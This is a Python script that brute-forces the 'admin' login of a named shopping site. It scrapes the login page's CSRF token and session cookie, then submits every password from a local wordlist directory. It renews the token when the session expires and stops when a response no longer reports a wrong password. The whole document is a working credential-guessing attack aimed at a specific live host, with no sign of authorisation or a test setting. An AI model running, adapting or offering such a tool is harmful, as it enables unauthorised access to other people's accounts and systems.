import os
import requests
import sys
from bs4 import BeautifulSoup

def send_post_request(password, password_file, csrf_token, cookie):
    url = "http://tm.shop.wc369.com/login"
    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "X-CSRF-TOKEN": csrf_token,
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "http://tm.shop.wc369.com",
        "Referer": "http://tm.shop.wc369.com/login",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": cookie
    }

    payload = 'account=admin&password=' + password

    response = requests.post(url, headers=headers, data=payload)
    response_json = response.json()
    print(f"Current file: {password_file}")

    # 检查响应是否为数据失效错误
    if response_json["code"] == 500 and response_json["msg"] == "\u8bf7\u6c42\u53d1\u751f\u9519\u8bef!":
        print(f"Password: {password} Cache is expired, updating and reposting...")
        return 0
    # 检查是否成功登录
    elif response_json["code"] != 500 and response_json["msg"] != "\u5bc6\u7801\u8f93\u5165\u4e0d\u6b63\u786e!":
        print(f"Password: {password} Response OK.")
        print(response.text)
        return 1

    print(f"Password: {password} Posted.")
    # print(response.text)
    return 2

def process_password_files_in_directory(directory):
    csrf_token, cookie = get_new_csrf_token_and_cookie()

    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(".txt"):
                password_file = os.path.join(root, file)
                with open(password_file, "r") as file:
                    passwords = file.read().splitlines()

                for password in passwords:
                    post_status = send_post_request(password, password_file, csrf_token, cookie)
                    if post_status == 0:
                        csrf_token, cookie = get_new_csrf_token_and_cookie()
                        new_post_status = send_post_request(password, password_file, csrf_token, cookie)
                        if new_post_status == 1:
                            sys.exit(0)
                        elif new_post_status == 2:
                            continue
                    elif post_status == 1:
                        sys.exit(0)
                    elif post_status == 2:
                        continue
                    

def get_new_csrf_token_and_cookie():
    # 发送GET请求获取登录页面
    login_url = 'http://tm.shop.wc369.com/login'
    response = requests.get(login_url)

    # 解析响应，获取csrf_token和cookie
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('meta', {'name': 'csrf-token'})['content']
    raw_cookie = response.cookies.get_dict()
    cookie = '; '.join([f"{key}={value}" for key, value in raw_cookie.items()])
    return csrf_token, cookie


def main():
    current_directory = os.path.dirname(os.path.abspath(__file__))
    password_directory = os.path.join(current_directory, "passwordDict")

    process_password_files_in_directory(password_directory)

if __name__ == "__main__":
    main()